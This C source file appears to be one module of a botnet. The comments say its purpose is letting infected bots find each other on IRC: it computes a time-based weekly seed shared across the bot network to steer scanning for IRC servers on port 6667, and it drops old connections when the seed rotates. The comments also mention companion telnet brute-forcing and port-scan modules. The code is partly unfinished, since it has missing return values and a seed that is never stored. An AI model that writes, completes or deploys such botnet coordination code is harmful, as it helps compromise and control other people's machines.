/*
fiding other bots using IRC requires a moodule because the seed has to change etc..
the actual WAY it scans for the irc servers must be coordinated via some algorithm

so this module will verify the current seed equals what it should have, and also
will be in charge of disconnecting already connected irc servers whenever the time
limit expires
 
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/time.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <fcntl.h>
#include "structs.h"
#include "list.h"
#include "utils.h"
#include "portscan.h"
#include "findbots.h"

// module id
#define FINDBOTS_MODULE_ID 11
#define FINDBOTS_SHARED_VAR 25

uint32_t cur_seed = 0;

// telnet brute forcing doesnt need nearly as many functions..
ModuleFuncs findbots_funcs = { NULL, NULL,NULL,NULL,&findbots_main_loop,NULL,NULL };

Modules CLK_FindBots = {
    NULL, NULL, 0, 1,
    // module ID
    FINDBOTS_MODULE_ID, 0,
    // port, state
    0, 0,
    // required 0, 0..  
    0, 0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // this will determine if we need to change seeds
    300,
    // telnet functions
    &findbots_funcs, NULL,
    // no magic bytes for telnet
    NULL, 0
};

void findbots_init(Modules **module_list) {
    Module_Add(module_list, &CLK_FindBots);
}

int findbots_seed_changed() {
    int i = 0;
    Modules *mptr = NULL;
    Connection *cptr = NULL;
    
    // lets do a 10% chance the bot doesn't disconnect from the current seed..
    // so some are left over.
    if ((rand()%100) < 10) return 0;
    
    // kill all connections under the module if it exists..
    if ((mptr = ModuleFind(NULL, 9)) != NULL) {
        cptr = mptr->connections;
        while (cptr != NULL) {
            ConnectionBad(cptr);
            
            cptr = cptr->next;
        }
        if (mptr->type == MODULE_TYPE_PYTHON) {
            python_module_deinit(mptr);
        }
    }
}

int findbots_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    struct timeval tv;
    uint32_t seed = 0;
    time_t cur;
    
    // lets get the current seconds since EPOCH
    gettimeofday(&tv, NULL);
    
    // now we must calculate the particular seed we wish to use for scanning to find irc servers
    // when the bots share the same algorithm.. then they will find each other on irc networks
    // the FINDBOTS_SHARED_VAR is what should be changed to separate a bot network
    
    // lets get how many seconds into the year..
    cur = tv.tv_sec % (60*60*24*7*52);
    
    // count how many days we are into the year..
    cur = cur / (60*60*24);
    
    // now lets count which week we are on..
    cur = cur / 7;
    
    seed = (cur * (FINDBOTS_SHARED_VAR * 0x00ffffff00)) >> 4;
    
    if (cur_seed != 0 && cur_seed != seed) {
        findbots_seed_changed();
    }
    
    // must transmit the seed to portscan for port 6667
    
    printf("SEED: %d %X\n", seed, seed);
    
}